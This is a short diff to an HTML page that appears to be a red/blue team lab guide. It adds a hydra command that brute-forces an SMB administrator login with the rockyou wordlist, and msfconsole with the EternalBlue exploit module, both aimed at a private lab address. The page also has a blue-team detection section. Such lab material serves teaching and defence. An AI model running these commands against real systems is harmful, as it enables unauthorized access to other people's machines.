@@ -112,16 +112,19 @@
   <h4>Attack 2 - Brute Force Login</h4>
     <pre>
       <code>
-        /* A simple CSS style rule */
-    .code-box {
-      border: 1px solid black;
-      padding: 10px;
-    }
-        Test
+        hydra -l administrator -P rockyou.txt smb://192.168.56.20
       </code>
     </pre>
     
   <h4>Attack 3 - Exploitation</h4>
+      <pre>
+      <code>
+        msfconsole
+      </code>
+      <code>
+        exploit/windows/smb/ms17_010_eternalblue    
+      </code>
+    </pre>
   
 <h2>Detect Attacks (Blue Team)</h2>
   <h4>Detect Process Execution</h4>
